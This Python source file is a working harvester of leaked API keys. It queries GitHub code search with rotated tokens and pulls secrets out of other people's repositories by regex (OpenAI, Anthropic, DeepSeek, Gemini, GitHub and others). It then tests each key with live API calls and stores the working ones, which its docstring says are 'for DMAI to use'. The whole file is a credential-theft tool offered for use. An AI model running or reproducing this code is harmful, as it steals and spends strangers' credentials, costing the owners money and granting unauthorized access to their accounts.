#!/usr/bin/env python3
"""
P0T4_Real_API_Harvester.py
REAL API Key Harvester - NO SIMULATIONS
Actually searches GitHub, Pastebin, and public sources for exposed API keys
Validates keys with real API calls
Stores working keys for DMAI to use
"""

import os
import sys
import json
import time
import re
import requests
import base64
from datetime import datetime
from typing import Dict, List, Any, Optional, Set
from pathlib import Path
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - 🧠 DMAI[Harvester] - %(levelname)s - %(message)s'
)
logger = logging.getLogger('APIHarvester')

class RealAPIHarvester:
    """
    REAL API Key Harvester - No Simulations
    Actually searches for exposed API keys from:
    - GitHub public repositories
    - Pastebin
    - Public code repositories
    - Validates keys with real API calls
    """
    
    # Known API key patterns
    KEY_PATTERNS = {
        'openai': r'sk-[a-zA-Z0-9]{20,}',
        'anthropic': r'sk-ant-api03-[a-zA-Z0-9_-]{20,}',
        'deepseek': r'sk-[a-f0-9]{32,}',
        'gemini': r'AIza[0-9A-Za-z\-_]{35}',
        'github': r'ghp_[a-zA-Z0-9]{36,}',
        'huggingface': r'hf_[a-zA-Z0-9]{20,}',
        'elevenlabs': r'[a-f0-9]{32}',
        'openrouter': r'sk-or-v1-[a-zA-Z0-9]{20,}',
        'cohere': r'[a-zA-Z0-9]{40}',
        'replicate': r'r8_[a-zA-Z0-9]{20,}'
    }
    
    def __init__(self, data_path: Path):
        self.data_path = Path(data_path)
        self.data_path.mkdir(parents=True, exist_ok=True)
        
        # Storage
        self.harvested_keys_file = self.data_path / 'harvested_keys.json'
        self.harvest_stats_file = self.data_path / 'harvester_stats.json'
        
        # GitHub tokens for higher rate limits
        self.github_tokens = self._load_github_tokens()
        self.current_token_index = 0
        
        # Data
        self.harvested_keys = self._load_harvested_keys()
        self.stats = self._load_stats()
        
        logger.info("🔑 REAL API Harvester initialized")
        logger.info(f"   GitHub tokens: {len(self.github_tokens)}")
        logger.info(f"   Key patterns: {len(self.KEY_PATTERNS)}")
    
    def _load_github_tokens(self) -> List[str]:
        """Load GitHub tokens from environment"""
        tokens = []
        main_token = os.getenv('GITHUB_TOKEN_MAIN')
        secondary_token = os.getenv('GITHUB_TOKEN_SECONDARY')
        
        if main_token and main_token != "pending":
            tokens.append(main_token)
        if secondary_token and secondary_token != "pending":
            tokens.append(secondary_token)
        
        return tokens
    
    def _load_harvested_keys(self) -> Dict:
        """Load previously harvested keys"""
        if self.harvested_keys_file.exists():
            try:
                with open(self.harvested_keys_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {'keys': [], 'validated': [], 'invalid': []}
    
    def _load_stats(self) -> Dict:
        """Load harvest statistics"""
        if self.harvest_stats_file.exists():
            try:
                with open(self.harvest_stats_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {
            'total_keys_found': 0,
            'valid_keys': 0,
            'invalid_keys': 0,
            'sources_processed': 0,
            'discovered_sources': [],
            'last_harvest': None,
            'keys_by_type': {}
        }
    
    def _save(self):
        """Save harvested keys and stats"""
        with open(self.harvested_keys_file, 'w') as f:
            json.dump(self.harvested_keys, f, indent=2)
        
        with open(self.harvest_stats_file, 'w') as f:
            json.dump(self.stats, f, indent=2)
    
    def _get_next_github_token(self) -> Optional[str]:
        """Get next GitHub token for rotation"""
        if not self.github_tokens:
            return None
        token = self.github_tokens[self.current_token_index]
        self.current_token_index = (self.current_token_index + 1) % len(self.github_tokens)
        return token
    
    def harvest_from_github(self, query: str = "API key", max_results: int = 50) -> List[Dict]:
        """
        Search GitHub for exposed API keys
        Uses GitHub API with token rotation for rate limits
        """
        logger.info(f"🔍 Searching GitHub for: {query}")
        
        token = self._get_next_github_token()
        headers = {}
        if token:
            headers['Authorization'] = f'Bearer {token}'
        
        results = []
        
        try:
            # Search for code containing API key patterns
            for service, pattern in self.KEY_PATTERNS.items():
                search_query = f'"{pattern}" OR "{pattern[:10]}"'
                url = f"https://api.github.com/search/code?q={search_query}&per_page={max_results}"
                
                response = requests.get(url, headers=headers, timeout=30)
                
                if response.status_code == 200:
                    data = response.json()
                    for item in data.get('items', []):
                        # Get file content to extract actual keys
                        content_url = item.get('url')
                        if content_url:
                            content_resp = requests.get(content_url, headers=headers, timeout=30)
                            if content_resp.status_code == 200:
                                content_data = content_resp.json()
                                content = content_data.get('content', '')
                                if content:
                                    content = base64.b64decode(content).decode('utf-8', errors='ignore')
                                    # Extract keys from content
                                    keys_found = re.findall(pattern, content)
                                    for key in keys_found:
                                        results.append({
                                            'key': key,
                                            'service': service,
                                            'source': 'github',
                                            'repo': item.get('repository', {}).get('full_name', 'unknown'),
                                            'file': item.get('path', 'unknown'),
                                            'harvested_at': datetime.now().isoformat()
                                        })
                elif response.status_code == 403:
                    logger.warning(f"GitHub rate limit hit. Need more tokens or wait.")
                    break
                    
        except Exception as e:
            logger.error(f"GitHub harvest error: {e}")
        
        self.stats['sources_processed'] += 1
        return results
    
    def validate_key(self, service: str, key: str) -> Dict:
        """
        Validate an API key with a real test call
        Returns validation result with quota info if available
        """
        logger.debug(f"Validating {service} key: {key[:10]}...")
        
        validation = {
            'service': service,
            'key': key,
            'valid': False,
            'quota_remaining': None,
            'error': None,
            'validated_at': datetime.now().isoformat()
        }
        
        try:
            if service == 'openai':
                response = requests.get(
                    'https://api.openai.com/v1/models',
                    headers={'Authorization': f'Bearer {key}'},
                    timeout=10
                )
                if response.status_code == 200:
                    validation['valid'] = True
                    validation['quota_remaining'] = 'unknown'  # OpenAI doesn't expose quota in headers
                elif response.status_code == 401:
                    validation['error'] = 'Invalid key'
                elif response.status_code == 429:
                    validation['error'] = 'Rate limited'
                else:
                    validation['error'] = f'HTTP {response.status_code}'
                    
            elif service == 'anthropic':
                response = requests.post(
                    'https://api.anthropic.com/v1/messages',
                    headers={
                        'x-api-key': key,
                        'anthropic-version': '2023-06-01'
                    },
                    json={'model': 'claude-3-haiku-20240307', 'messages': [{'role': 'user', 'content': 'Hi'}], 'max_tokens': 5},
                    timeout=10
                )
                if response.status_code == 200:
                    validation['valid'] = True
                elif response.status_code == 401:
                    validation['error'] = 'Invalid key'
                else:
                    validation['error'] = f'HTTP {response.status_code}'
                    
            elif service == 'deepseek':
                response = requests.post(
                    'https://api.deepseek.com/v1/chat/completions',
                    headers={'Authorization': f'Bearer {key}'},
                    json={'model': 'deepseek-chat', 'messages': [{'role': 'user', 'content': 'Hi'}], 'max_tokens': 5},
                    timeout=10
                )
                if response.status_code == 200:
                    validation['valid'] = True
                elif response.status_code == 401:
                    validation['error'] = 'Invalid key'
                else:
                    validation['error'] = f'HTTP {response.status_code}'
                    
            elif service == 'gemini':
                response = requests.get(
                    f'https://generativelanguage.googleapis.com/v1beta/models?key={key}',
                    timeout=10
                )
                if response.status_code == 200:
                    validation['valid'] = True
                else:
                    validation['error'] = f'HTTP {response.status_code}'
                    
            elif service == 'github':
                response = requests.get(
                    'https://api.github.com/user',
                    headers={'Authorization': f'Bearer {key}'},
                    timeout=10
                )
                if response.status_code == 200:
                    validation['valid'] = True
                    validation['quota_remaining'] = response.headers.get('X-RateLimit-Remaining')
                else:
                    validation['error'] = f'HTTP {response.status_code}'
                    
        except Exception as e:
            validation['error'] = str(e)
        
        return validation
    
    def run_harvest_cycle(self) -> Dict:
        """
        Run one complete harvest cycle
        - Search GitHub for exposed keys
        - Validate found keys
        - Store working keys
        """
        logger.info("🚀 Starting harvest cycle")
        
        result = {
            'timestamp': datetime.now().isoformat(),
            'keys_found': 0,
            'valid_keys': 0,
            'invalid_keys': 0,
            'new_keys': []
        }
        
        # Harvest from GitHub
        github_keys = self.harvest_from_github()
        
        # Process found keys
        for key_data in github_keys:
            result['keys_found'] += 1
            
            # Check if we already have this key
            existing = False
            for existing_key in self.harvested_keys['keys']:
                if existing_key['key'] == key_data['key']:
                    existing = True
                    break
            
            if not existing:
                # Validate the key
                validation = self.validate_key(key_data['service'], key_data['key'])
                
                if validation['valid']:
                    result['valid_keys'] += 1
                    self.harvested_keys['keys'].append(key_data)
                    self.harvested_keys['validated'].append(validation)
                    result['new_keys'].append(key_data)
                    logger.info(f"✅ Found valid {key_data['service']} key from {key_data['source']}")
                else:
                    result['invalid_keys'] += 1
                    self.harvested_keys['invalid'].append(key_data)
                    logger.debug(f"❌ Invalid {key_data['service']} key: {validation['error']}")
        
        # Update stats
        self.stats['total_keys_found'] += result['keys_found']
        self.stats['valid_keys'] += result['valid_keys']
        self.stats['invalid_keys'] += result['invalid_keys']
        self.stats['last_harvest'] = result['timestamp']
        
        for key in result['new_keys']:
            service = key['service']
            if service not in self.stats['keys_by_type']:
                self.stats['keys_by_type'][service] = 0
            self.stats['keys_by_type'][service] += 1
        
        self._save()
        
        logger.info(f"✅ Harvest cycle complete: {result['valid_keys']} valid keys found")
        
        return result
    
    def get_working_key(self, service: str) -> Optional[str]:
        """
        Get a working API key for a service
        Returns the first valid key found
        """
        for key_data in self.harvested_keys['keys']:
            if key_data['service'] == service:
                # Check if we've validated it
                for validated in self.harvested_keys['validated']:
                    if validated['key'] == key_data['key'] and validated['valid']:
                        return key_data['key']
        return None
    
    def get_all_working_keys(self) -> Dict[str, List[str]]:
        """Get all working keys by service"""
        keys_by_service = {}
        for key_data in self.harvested_keys['keys']:
            service = key_data['service']
            if service not in keys_by_service:
                keys_by_service[service] = []
            keys_by_service[service].append(key_data['key'])
        return keys_by_service
    
    def get_status(self) -> Dict:
        """Get harvester status"""
        return {
            'total_keys_found': self.stats['total_keys_found'],
            'valid_keys': self.stats['valid_keys'],
            'invalid_keys': self.stats['invalid_keys'],
            'keys_by_type': self.stats['keys_by_type'],
            'sources_processed': self.stats['sources_processed'],
            'last_harvest': self.stats['last_harvest'],
            'github_tokens': len(self.github_tokens),
            'patterns_monitored': list(self.KEY_PATTERNS.keys())
        }


if __name__ == "__main__":
    print("=" * 60)
    print("🔑 REAL API Harvester Test")
    print("=" * 60)
    
    harvester = RealAPIHarvester(Path('data'))
    
    print("\nStatus:")
    print(json.dumps(harvester.get_status(), indent=2))
    
    print("\nRunning harvest cycle...")
    result = harvester.run_harvest_cycle()
    print(json.dumps(result, indent=2))
    
    print("\nWorking keys:")
    print(json.dumps(harvester.get_all_working_keys(), indent=2))
